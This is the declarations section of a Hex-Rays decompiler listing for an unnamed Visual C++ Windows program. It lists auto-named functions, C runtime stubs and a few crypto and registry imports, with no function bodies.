/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int sub_401000();
int sub_401020();
int sub_401040();
int sub_401060();
int sub_401080();
int sub_401090();
int sub_4010B0();
int sub_4010D0();
int sub_4010F0();
int sub_401110();
int sub_401130();
int sub_401146();
int sub_40115C();
int sub_401168();
int sub_401174();
void *sub_4011CD();
int sub_4011D7();
int sub_4011ED();
int sub_4011F9();
int sub_40120F();
char sub_401230();
char *__fastcall sub_4013F0(char *Src, const char *a2);
bool __cdecl sub_4014B0(CHAR *lpSubKey, int a2, int a3, int a4, int a5, unsigned int a6, CHAR *lpValueName, int a8, int a9, int a10, int a11, unsigned int a12, char *Block, int a14, int a15, int a16, int a17, unsigned int a18, char *a19, int a20, int a21, int a22, int a23, unsigned int a24);
bool sub_4017D0();
int __thiscall sub_401930(char *this, int a2, int a3);
void __thiscall sub_401970(char **this);
char **__thiscall sub_4019D0(char **this, void *Src);
_DWORD *__thiscall sub_401A10(_DWORD *this, _DWORD *Src);
_DWORD _guard_check_icall_nop(); // weak
void __stdcall sub_401AB0(_DWORD *Block);
char __thiscall sub_401B40(char *Src, char a2);
void *__stdcall sub_401C70(size_t Size);
void __stdcall sub_401CD0(_DWORD *Block, unsigned int a2);
char **__thiscall sub_401D10(char **this, void *Src, size_t Size);
_DWORD *sub_401E10();
int __fastcall sub_401E30(char *Buf, unsigned int a2, int a3, char *a4, unsigned int a5);
void __noreturn sub_401F10();
bool __fastcall sub_401F20(int *a1, int a2);
void *sub_401FB0();
int __fastcall sub_401FC0(int a1, int a2, int a3, int a4);
int sub_401FF0(int a1, int a2, ...);
void *__fastcall sub_402080(_DWORD *a1, int *a2);
_DWORD *__cdecl sub_4021A0(_DWORD *Block, int a2, int a3, int a4, unsigned int a5, unsigned int a6);
bool __stdcall sub_402270(CHAR *lpFileName, LPCSTR a2, const CHAR *a3);
_DWORD *__thiscall sub_402630(_DWORD *this, int a2, _DWORD *a3, int a4);
void __thiscall sub_402690(void **this);
_DWORD *__cdecl sub_402700(_DWORD *a1);
DWORD __fastcall sub_402730(int *a1, _DWORD *a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_403260(int *this, _DWORD *Src);
char **__thiscall sub_403420(_DWORD *this, char **a2, unsigned int a3, unsigned int a4);
// int __stdcall std::string::append(void *); idb
char **__thiscall sub_403490(char **this, char **a2);
unsigned int __stdcall sub_403520(_DWORD *a1, _DWORD *a2);
void __noreturn sub_4035D0();
int __thiscall sub_4035E0(int *this, int a2, int a3, int a4);
void __stdcall sub_403680(_DWORD *Block, unsigned int a2);
char **__thiscall sub_4036D0(char **Src, void *Srca, size_t Size);
void __noreturn sub_403840();
void *__thiscall sub_403850(void *this);
void __fastcall sub_403860(int a1, int a2);
void __fastcall sub_4038C0(int a1, int a2);
int __fastcall sub_403930(int a1, int a2, int a3);
int __cdecl sub_403980(char *Buffer, size_t BufferCount, char *Format, _locale_t Locale, va_list ArgList); // idb
int sub_4039C0(char *Buffer, size_t BufferCount, char *Format, ...);
char *__thiscall sub_4039E0(char *this, int a2);
char *__thiscall sub_403A30(char *this, int a2);
const char *__thiscall sub_403A60(_DWORD *this);
char *__thiscall sub_403A70(char *Block, char a2);
char *__thiscall sub_403AA0(char *this, int a2);
struct std::_Locinfo *__thiscall sub_403B20(struct std::_Locinfo *this, char *Locale);
void __thiscall sub_403BE0(std::_Lockit *this);
char *__thiscall sub_403CB0(char *this, int a2);
_DWORD *__thiscall sub_403CF0(_DWORD *Block, char a2);
void __thiscall sub_403D20(volatile signed __int32 *this);
volatile signed __int32 *__thiscall sub_403D30(volatile signed __int32 *this);
void __thiscall sub_403D50(_DWORD *this);
void __thiscall sub_403D60(_DWORD *this);
int sub_403DB0();
int __thiscall sub_403DC0(int this, unsigned __int8 a2);
_BYTE *__thiscall sub_403DE0(char *this, _BYTE *a2, unsigned int a3);
int __thiscall sub_403E30(int this, unsigned __int8 a2);
_BYTE *__thiscall sub_403E50(char *this, _BYTE *a2, unsigned int a3);
int __stdcall sub_403EB0(void *Src, int a2, void *a3); // idb
int __stdcall sub_403EE0(void *Src, int a2, int a3, void *a4); // idb
void *__thiscall sub_403F00(void *Block, char a2);
bool __thiscall sub_403F80(void *this, int a2, _DWORD *a3);
bool __thiscall sub_403FC0(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__cdecl sub_403FF0(_DWORD *a1, int a2);
// int __userpurge sub_404070@<eax>(int a1@<ecx>, int a2@<ebp>, int a3, int a4, _DWORD *a5);
char *__thiscall sub_404220(char *Block, char a2);
const char *sub_404250();
char **__stdcall sub_404260(char **a1, int a2);
void *__thiscall sub_4042E0(void *Block, char a2);
_DWORD *__thiscall sub_404300(_DWORD *this, void *Src, int *a3);
int __thiscall sub_4043E0(_DWORD *this, char a2, char a3);
char *__thiscall sub_4044A0(char *this, int a2);
char *__thiscall sub_4044F0(char *this, int a2);
char *__thiscall sub_404540(char *this, int a2);
struct std::ios_base *__thiscall sub_404590(struct std::ios_base *this, char a2);
void sub_404600();
void __stdcall sub_407270(BYTE *pbData, int a2, DWORD *pdwDataLen, HCRYPTKEY hKey, char *Block, int a6, int a7, int a8, int a9, unsigned int a10, _DWORD *a11, int a12, int a13, int a14, int a15, unsigned int a16);
// void __userpurge sub_407400(int a1@<ebp>, _DWORD *a2, int a3, int a4, int a5, size_t a6, unsigned int a7, char *a8, int a9, int a10, int a11, int a12, unsigned int a13, char *a14, int a15, int a16, int a17, int a18, unsigned int a19);
void __thiscall sub_407870(_DWORD *this);
void __thiscall sub_407900(int *this);
int __fastcall sub_407A60(unsigned int a1);
// char *__usercall sub_407CE0@<eax>(_DWORD *a1@<edx>, char *a2@<ecx>, int a3@<ebp>);
int __fastcall sub_407ED0(int a1, char *a2);
void __thiscall sub_408150(_DWORD *this);
char *__fastcall sub_4081E0(char *Src, _DWORD *a2);
// void __usercall sub_4082E0(int a1@<ebp>, int a2@<edi>, int a3@<esi>, unsigned int a4, int a5, int a6, int a7, size_t a8, unsigned int a9, unsigned int a10, int a11, int a12, int a13, size_t a14, unsigned int a15);
void __thiscall sub_409B60(_DWORD *this);
int *__thiscall sub_409C20(int *this, int a2);
void __thiscall sub_409D90(int *this);
char **__thiscall sub_409E40(char **this, size_t Size, char a3);
_DWORD *__thiscall sub_409F50(_DWORD *this, int a2);
int __thiscall sub_409F70(FILE **this);
FILE **__thiscall sub_409FA0(FILE **this, char *Buffer, __int64 Size);
int __thiscall sub_409FF0(int this, int a2, __int64 Offset, fpos_t a4, int a5, int a6, int a7);
int __thiscall sub_40A100(int this, int a2, __int64 a3, int Origin, int a5);
int __thiscall sub_40A220(int this);
int __thiscall sub_40A490(_DWORD **this);
int __thiscall sub_40A4D0(int this, int a2);
int __thiscall sub_40A580(int this, int a2);
void __thiscall sub_40A7A0(FILE **this);
void __thiscall sub_40A7B0(FILE **this);
void __thiscall sub_40A7C0(_DWORD *this);
char *__thiscall sub_40A8D0(char *this, int a2, __int64 a3);
int __thiscall sub_40AA60(_DWORD *this);
int __cdecl UserMathErrorFunction();
void *__thiscall sub_40AAA0(void *this, int a2, int a3, int a4);
int __stdcall sub_40AAB0(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
int __stdcall sub_40AAF0(int a1, int a2, int a3, int a4, int a5);
unsigned int __thiscall sub_40AB30(_DWORD **this, unsigned __int8 *Src, __int64 a3);
unsigned int __thiscall sub_40AC40(_DWORD **this, char *a2, __int64 a3);
int __thiscall sub_40AD40(_DWORD **this);
int sub_40AD70();
__int64 sub_40AD80();
int __stdcall sub_40AD90(int a1);
void __thiscall sub_40ADA0(struct std::ios_base *this);
char *__thiscall sub_40ADF0(_DWORD *this, char a2);
char *__thiscall sub_40AE20(struct std::ios_base *this, char a2);
char *__thiscall sub_40AED0(struct std::ios_base *this, char a2);
_DWORD *__thiscall sub_40AF80(_DWORD *Block, char a2);
char *__thiscall sub_40AFC0(struct std::ios_base *this, char a2);
char *__thiscall sub_40B080(struct std::ios_base *this, char a2);
int __thiscall sub_40B100(int *this);
char *__thiscall sub_40B150(struct std::ios_base *this, char a2);
_DWORD *__thiscall sub_40B1D0(_DWORD *Block, char a2);
struct std::ios_base *__thiscall sub_40B260(struct std::ios_base *this, char a2);
void __thiscall sub_40B2C0(char *this);
int __thiscall sub_40B330(int *this);
unsigned int __stdcall sub_40B380(int a1, int a2, int a3, unsigned int a4);
int __stdcall sub_40B3C0(int a1, int a2, int a3, _DWORD *a4, int a5, int a6, _DWORD *a7);
char sub_40B3E0();
int __thiscall sub_40B3F0(_BYTE **this);
_BYTE *__thiscall sub_40B460(_BYTE *this, char *a2);
void __noreturn sub_40B4F0();
char **__thiscall sub_40B500(char **Src, size_t Size, char a3);
_DWORD *__thiscall sub_40B670(_DWORD *this, char *a2, int a3, int a4, int a5);
// int __thiscall std::filebuf::_Reset_back(_DWORD); weak
_DWORD *__thiscall sub_40B7B0(_DWORD *this, int a2);
char __thiscall sub_40B840(char *this);
int __thiscall sub_40B9B0(int this, FILE *Stream, int a3);
int __thiscall sub_40BAB0(int this);
_DWORD *__thiscall sub_40BB70(_DWORD *this, char *a2, int a3, int a4);
_DWORD *__thiscall sub_40BC40(_DWORD *this, int a2, char a3, int a4);
__int64 __thiscall sub_40BCE0(_DWORD **this);
__int64 __thiscall sub_40BD00(_DWORD **this);
_DWORD *__thiscall sub_40BD20(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40BD50(_DWORD *this, int a2, int a3);
char *__thiscall sub_40BE10(char *this);
int __thiscall sub_40BEE0(_BYTE *this);
char __thiscall sub_40BF70(char *this, int a2);
_DWORD *__thiscall sub_40C000(_DWORD *this);
void __thiscall sub_40C0C0(struct std::ios_base *this, int a2, char a3);
// struct std::_Facet_base *__usercall sub_40C210@<eax>(int a1@<ebp>, int a2);
int __thiscall sub_40C390(_DWORD *this, int a2, _DWORD *a3);
char **__fastcall sub_40C3B0(char **a1, _DWORD *a2, char *a3);
int __fastcall sub_40C470(int a1, char **a2, size_t **a3);
_DWORD *__cdecl sub_40C4D0(int a1);
void __thiscall sub_40C620(char **this, unsigned int a2);
int __stdcall sub_40C7A0(void *a1, _DWORD *a2, void **a3);
int __thiscall sub_40C7C0(_DWORD *this, int a2, int a3, _DWORD *a4, char a5);
char *__fastcall sub_40C920(char *a1, int a2, unsigned int a3);
unsigned int __thiscall sub_40CB80(_DWORD *this);
_DWORD *__thiscall sub_40CCD0(_DWORD *this, _DWORD *a2, char a3, _DWORD *a4, int a5, int a6);
_DWORD *__thiscall sub_40CEE0(_DWORD *this, int a2);
_DWORD *__thiscall sub_40CF30(_DWORD *this);
char *__thiscall sub_40CF4D(_DWORD *this, char a2);
char *__thiscall sub_40CF55(_DWORD *this, char a2);
char *__thiscall sub_40CF5D(_DWORD *this, char a2);
char *__thiscall sub_40CF65(_DWORD *this, char a2);
char *__thiscall sub_40CF6D(_DWORD *this, char a2);
char *__thiscall sub_40CF75(_DWORD *this, char a2);
int __fastcall sub_40CF80(int *a1, int a2, int a3, int a4, int a5);
int __thiscall sub_40CFC0(LPCRITICAL_SECTION lpCriticalSection); // idb
int __cdecl sub_40CFF0(int *a1, int a2, int a3, int a4);
char **__fastcall sub_40D080(char **a1, const CHAR *lpSubKey, LPCSTR lpValueName);
int sub_40D1F0();
int sub_40D260();
void __cdecl sub_40D2D0(char *Block, int a2, int a3, int a4, int a5, unsigned int a6);
BOOL sub_40D4F0();
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
void __thiscall sub_40EA50(_BYTE *this);
int __thiscall sub_40EB10(int this, int a2, __int64 a3, __int64 a4, int a5, int a6, char a7);
int __thiscall sub_40EC50(int this, int a2, __int64 a3, int a4, char a5);
int __thiscall sub_40EE20(int this);
int __thiscall sub_40EE80(int this, int a2);
int __thiscall sub_40EEE0(int this, int a2);
void __thiscall sub_40F0B0(_BYTE *this);
char *__thiscall sub_40F1D0(char *this, int a2);
char *__thiscall sub_40F470(char *this, char a2);
_BYTE *__thiscall sub_40F4A0(_BYTE *Block, char a2);
_DWORD *__thiscall sub_40F4D0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, const void *ArgList);
_DWORD *__thiscall sub_40F540(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, double X);
_DWORD *__thiscall sub_40F710(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, double X);
_DWORD *__thiscall sub_40F8E0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, int ArgList, int a8);
_DWORD *__thiscall sub_40F960(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, int ArgList, int a8);
_DWORD *__thiscall sub_40F9E0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, int ArgList);
_DWORD *__thiscall sub_40FA60(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, int ArgList);
_DWORD *__thiscall sub_40FAE0(void *this, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, char a6, unsigned __int8 a7);
char **__thiscall sub_40FCD0(_DWORD *this, char **a2);
char **__thiscall sub_40FD10(_DWORD *this, char **a2);
char **__thiscall sub_40FD50(_DWORD *this, char **a2);
char __thiscall sub_40FD90(_BYTE *this);
char __thiscall sub_40FDA0(_BYTE *this);
_DWORD *__cdecl sub_40FDB0(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int8 a5, int a6);
_DWORD *__cdecl sub_40FE30(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int8 *a5, int a6);
_DWORD *__cdecl sub_40FEB0(int a1, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, _BYTE *a7, size_t Size);
_BYTE *__cdecl sub_4102D0(int a1, _BYTE *a2, _BYTE *a3, __int16 a4);
_DWORD *__cdecl sub_410360(int a1, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, unsigned __int8 a6, char *Str, size_t Size);
_BYTE *__cdecl sub_4107E0(int a1, _BYTE *a2, char a3, __int16 a4);
void *__thiscall sub_4108A0(void *Block, char a2);
// int __thiscall unknown_libname_2(_DWORD); weak
char *__fastcall sub_410910(char *a1, const char *a2);
char *__cdecl sub_410BB0(char *a1);
void *__cdecl sub_410C60(int a1);
char **__thiscall sub_410DE0(char **Src, unsigned int a2, int a3, size_t Size, size_t a5, char a6);
char *__thiscall sub_410F30(char *this, unsigned __int8 a2);
char __thiscall sub_4110C0(int this, int a2, char a3);
char *__thiscall sub_411259(char *this, char a2);
int __cdecl sub_411270(int *a1, int a2, int a3);
_DWORD *__thiscall sub_411290(_DWORD *this, char *Src);
int __thiscall sub_4113C0(_DWORD *this, int a2);
void *__thiscall sub_411AD0(_DWORD *this, char *Src, unsigned int a3);
char **__thiscall sub_411B80(_BYTE *this, char **a2);
void sub_411C30();
void __thiscall sub_412200(_DWORD *this, int a2, int a3);
// int __usercall sub_412400@<eax>(int a1@<ecx>, int a2@<ebp>, _DWORD *a3, int a4, int a5, int a6, unsigned int a7, unsigned int a8);
void __thiscall sub_4127F0(_DWORD *this, int a2, int a3);
int __thiscall sub_412C50(int this, _BYTE *a2);
void **__cdecl sub_413130(_DWORD *Src, int a2, int a3, int a4, size_t Size, unsigned int a6);
char *__thiscall sub_4133D9(char *this, int a2);
_DWORD *__thiscall sub_4133F4(_DWORD *this);
char *__thiscall sub_41340C(char *this, int a2);
char *__thiscall sub_413427(char *this, int a2);
char *__thiscall sub_413448(char *this, int a2);
char *__thiscall sub_413463(char *this, int a2);
char *__thiscall sub_41347E(char *this, int a2);
void __cdecl __noreturn sub_41349F(int a1);
void __cdecl __noreturn sub_4134BF(int a1);
// _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this); idb
// _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, int); idb
// void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this); idb
// int __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *); idb
// void __thiscall std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t(std::_Fac_tidy_reg_t *__hidden this); idb
// void __cdecl std::_Facet_Register(struct std::_Facet_base *); idb
int sub_413763();
// struct std::locale::_Locimp *__cdecl std::locale::_Init(bool); idb
// void __cdecl std::_Locinfo::_Locinfo_ctor(struct std::_Locinfo *, const char *Locale); idb
// void __cdecl std::_Locinfo::_Locinfo_dtor(struct std::_Locinfo *); idb
int __fastcall j____uncaught_exception(_DWORD); // weak
// void __cdecl std::ios_base::_Addstd(struct std::ios_base *); idb
// void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *); idb
FILE *__cdecl sub_413A9B(char *FileName, int a2, int ShFlag);
FILE *__cdecl sub_413B3D(char *FileName, int a2, int ShFlag);
FILE *__cdecl sub_413B46(char *FileName, int a2, int ShFlag);
// unsigned int __cdecl std::_Random_device(); idb
// const char *__cdecl std::_Syserror_map(int); idb
// _Ctypevec *__cdecl _Getctype(_Ctypevec *__return_ptr __struct_ptr retstr);
// int __cdecl _Tolower(int, const _Ctypevec *);
// int __cdecl _Toupper(int, const _Ctypevec *);
// _Cvtvec *__cdecl _Getcvt(_Cvtvec *__return_ptr __struct_ptr retstr);
// int __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection); idb
void __cdecl sub_413F12(LPCRITICAL_SECTION lpCriticalSection);
// void __thiscall _Init_atexit::~_Init_atexit(_Init_atexit *__hidden this); idb
// void __fastcall __security_check_cookie(uintptr_t StackCookie);
// void *__cdecl operator new(size_t Size); idb
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *)); idb
// int __cdecl atexit(void (__cdecl *)());
void __cdecl j__free(void *Block);
void __cdecl sub_414AF8(void *Block);
_DWORD *__thiscall sub_414B06(_DWORD *Block, char a2);
// int __cdecl unknown_libname_5(_DWORD); weak
void __cdecl j_j__free(void *Block);
// _DWORD __cdecl _Init_thread_footer(_DWORD); weak
// _DWORD __cdecl _Init_thread_header(_DWORD); weak
int sub_41503A();
int sub_415042();
_DWORD _guard_check_icall_nop(); // weak
char *__thiscall sub_415328(char *this, int a2);
_DWORD *__thiscall sub_415343(_DWORD *this);
void __noreturn sub_415388();
void __noreturn sub_4153A5(); // weak
int sub_4155CA();
LPTOP_LEVEL_EXCEPTION_FILTER sub_415729();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_415776();
void sub_415826();
void *sub_415853();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_415876();
void *sub_415882();
void *sub_415888();
void sub_41588E();
void __cdecl sub_4158B9(); // idb
int __thiscall sub_41591D(int this);
_DWORD *__thiscall sub_415970(_DWORD *this);
// void *__cdecl memmove(void *, const void *Src, size_t Size);
// void *__cdecl memchr(const void *Buf, int Val, size_t MaxCount);
// _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD); weak
// _DWORD __cdecl __std_exception_destroy(_DWORD); weak
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// void *__cdecl memmove_0(void *, const void *Src, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);
// __vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);
char *__thiscall sub_41891C(char *this, int a2);
_DWORD *__thiscall sub_418937(_DWORD *this);
// void __cdecl perror(const char *ErrMsg);
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const); idb
// int __cdecl tolower(int C);
int __cdecl sub_419DE5(int a1);
// void __cdecl _invalid_parameter_noinfo();
// void __cdecl __noreturn _invalid_parameter_noinfo_noreturn();
// FILE *__cdecl __acrt_iob_func(unsigned int Ix);
// errno_t __cdecl _get_stream_buffer_pointers(FILE *Stream, char ***Base, char ***Pointer, int **Count);
// void __cdecl _lock_file(FILE *Stream);
// void __cdecl _unlock_file(FILE *Stream);
// _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_41A0B3(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7);
int __cdecl sub_41A233(int a1, int a2, int *a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7);
// _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(_DWORD); weak
// _DWORD __stdcall unknown_libname_10(_DWORD, _DWORD, char); weak
// _DWORD __stdcall unknown_libname_11(_DWORD, _DWORD, _DWORD, char); weak
// _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_12(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(__crt_stdio_output::formatting_buffer *__hidden this); idb
// _DWORD __stdcall unknown_libname_14(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_15(char, _DWORD); weak
// _DWORD __stdcall unknown_libname_16(_DWORD); weak
int __thiscall sub_41A976(int this);
int __thiscall sub_41AA92(int this);
int __thiscall sub_41ABBA(int this);
// int __thiscall unknown_libname_17(_DWORD); weak
char __thiscall sub_41AD13(void *this);
char __thiscall sub_41AD32(char *this);
char __thiscall sub_41AD51(int this);
char __thiscall sub_41AD8D(char *this);
// _DWORD __stdcall unknown_libname_18(_DWORD); weak
// _DWORD __stdcall unknown_libname_19(_DWORD); weak
char __thiscall sub_41AE84(int this);
char __thiscall sub_41AEAC(_BYTE *this);
char __thiscall sub_41B01D(_BYTE *this);
char __thiscall sub_41B18E(int this);
char __thiscall sub_41B3B6(int this);
char __thiscall sub_41B5DE(int this);
// int __cdecl __crt_stdio_output::to_integer_size(_DWORD); weak
// int __thiscall unknown_libname_20(_DWORD); weak
// int __thiscall unknown_libname_21(_DWORD); weak
// _DWORD __stdcall unknown_libname_22(_DWORD); weak
char __thiscall sub_41B8B8(int this, int a2, char a3);
// int __thiscall unknown_libname_23(_DWORD); weak
char __thiscall sub_41BA7D(_DWORD *this);
char __thiscall sub_41BA9C(_DWORD *this);
// int __thiscall unknown_libname_24(_DWORD); weak
// int __thiscall unknown_libname_25(_DWORD); weak
// int __thiscall unknown_libname_26(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD); weak
// _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_character_without_count_update(char); weak
// _DWORD __stdcall unknown_libname_27(_DWORD); weak
// _DWORD __stdcall unknown_libname_28(_DWORD); weak
// _DWORD __stdcall __crt_stdio_output::stream_output_adapter<char>::write_string(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall unknown_libname_29(void *Src, int, int, int); idb
int __cdecl sub_41BEE7(int a1, int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_41BF6C(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7);
// int __cdecl __stdio_common_vsprintf_s(unsigned __int64 Options, char *Buffer, size_t BufferCount, const char *Format, _locale_t Locale, va_list ArgList);
// int __cdecl fputc(int Character, FILE *Stream);
// int __cdecl common_flush_all(bool); idb
int sub_41C3A1();
// int __cdecl fflush(FILE *Stream);
// int __cdecl fclose(FILE *Stream);
// int __cdecl fgetc(FILE *Stream);
// void __noreturn terminate(void); weak
// int __cdecl _stat64i32(const char *FileName, struct _stat64i32 *Stat);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
// int __cdecl fgetpos(FILE *Stream, fpos_t *Position);
// int __cdecl setvbuf(FILE *Stream, char *Buffer, int Mode, size_t Size);
// void __cdecl free(void *Block);
// int __cdecl ungetc(int Character, FILE *Stream);
// int __cdecl fsetpos(FILE *Stream, const fpos_t *Position);
// int __cdecl _fseeki64(FILE *Stream, __int64 Offset, int Origin);
// int __cdecl fseek(FILE *Stream, int Offset, int Origin);
// void *__cdecl malloc(size_t Size);
int __cdecl sub_41DA67(int a1);
// intptr_t __cdecl _loaddll(char *FileName);
// void *__cdecl calloc(size_t Count, size_t Size);
// FILE *__cdecl _fsopen(const char *FileName, const char *Mode, int ShFlag);
// FILE *__cdecl fopen(const char *FileName, const char *Mode);
// size_t __cdecl mbstowcs(wchar_t *Dest, const char *Source, size_t MaxCount);
// int __cdecl rand();
// size_t __cdecl strcspn(const char *Str, const char *Control);
// struct lconv *__cdecl localeconv();
// double __cdecl frexp(double X, int *Y);
// errno_t __cdecl strcat_s(char *Destination, rsize_t SizeInBytes, const char *Source);
// void *__cdecl _realloc_base(void *Block, size_t Size);
// int __thiscall unknown_libname_32(_DWORD); weak
int __cdecl sub_41F711(int a1);
int sub_41FC39();
// int common_initialize_environment_nolock<char>(void); weak
// int __cdecl unknown_libname_34(void *Block); idb
// int initialize_environment_by_cloning_nolock<char>(void); weak
void *__cdecl sub_41FFBF(void **a1);
void *__cdecl sub_41FFDA(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
int __cdecl sub_42033D(_onexit_t Function); // idb
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_4203F4();
char sub_42041B();
__vcrt_bool sub_420460();
int sub_420542();
int __cdecl sub_420548(int a1);
int __cdecl sub_42056F(int a1);
int __cdecl sub_4206C9(_DWORD *a1);
__int32 sub_420AB5();
int sub_4219A0();
// int __cdecl _set_new_mode(int NewMode);
int *sub_4219D5();
char *__cdecl sub_421A3A(void *Block, unsigned int a2, unsigned int a3);
char **sub_4224CB();
const char *sub_4224D1();
// int __acrt_getptd(void); weak
struct __crt_locale_data *__cdecl sub_423A30(int a1, struct __crt_locale_data **a2);
struct __crt_multibyte_data *__cdecl sub_423A5D(int a1, struct __crt_multibyte_data **a2);
BOOL __stdcall LocaleEnumProc(LPWSTR a1); // idb
// _DWORD __stdcall unknown_libname_41(_DWORD); weak
int sub_423BC9();
int sub_423BE3();
int sub_423BFD();
int sub_423C17();
int sub_423C31();
int sub_423C4B();
int sub_423C65();
// int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __stdcall sub_424243(wchar_t *a1, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest, int a7, int a8, int a9); // idb
// int __stdcall __acrt_LocaleNameToLCID(wchar_t *, int); idb
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_425802(int a1);
char sub_427BB7();
int *sub_42964C();
int *sub_429652();
int *sub_429658();
int sub_42965E();
int __cdecl sub_429664(_DWORD *a1);
int __cdecl sub_429690(_DWORD *a1);
int __cdecl sub_4296BC(_DWORD *a1);
// struct __crt_multibyte_data *__cdecl update_thread_multibyte_data_internal(struct __acrt_ptd *const, struct __crt_multibyte_data **const); idb
struct __crt_multibyte_data *sub_42A959();
// _DWORD __cdecl copy_environment<char>(_DWORD); weak
int sub_42AFFA();
// int __acrt_update_thread_locale_data(void); weak
SIZE_T __cdecl sub_42D939(LPCVOID lpMem);
// void __cdecl __dcrt_lowio_initialize_console_output(); idb
BOOL sub_431C1D();
int __cdecl sub_432714(double a1);
// int __cdecl _ceil_default(double); idb
void __cdecl sub_434650(); // idb
void __cdecl sub_4346D0(); // idb
void __cdecl sub_434750(); // idb
void __cdecl sub_4347D0(); // idb
void __cdecl sub_434850(); // idb
void __cdecl sub_4348C0(); // idb
void __cdecl sub_434940(); // idb
void __cdecl sub_4349C0(); // idb
void __cdecl sub_434A30(); // idb
void __cdecl sub_434AA0(); // idb
void __cdecl sub_434B20(); // idb
void __cdecl sub_434BA0(); // idb
void __cdecl sub_434BAA(); // idb
void __cdecl sub_434BB4(); // idb
void __cdecl sub_434BBE(); // idb
void __cdecl sub_434BC8(); // idb
void __cdecl sub_434BD2(); // idb
void __cdecl sub_434BDC(); // idb
void __cdecl sub_434BE6(); // idb
void __cdecl sub_434BF0(); // idb

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_433450; // weak
_UNKNOWN loc_433A3A; // weak
_UNKNOWN loc_433B39; // weak
_UNKNOWN loc_433E18; // weak
_UNKNOWN loc_4340F7; // weak
_UNKNOWN loc_43456B; // weak
// extern BOOL (__stdcall *CryptDestroyKey)(HCRYPTKEY hKey);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
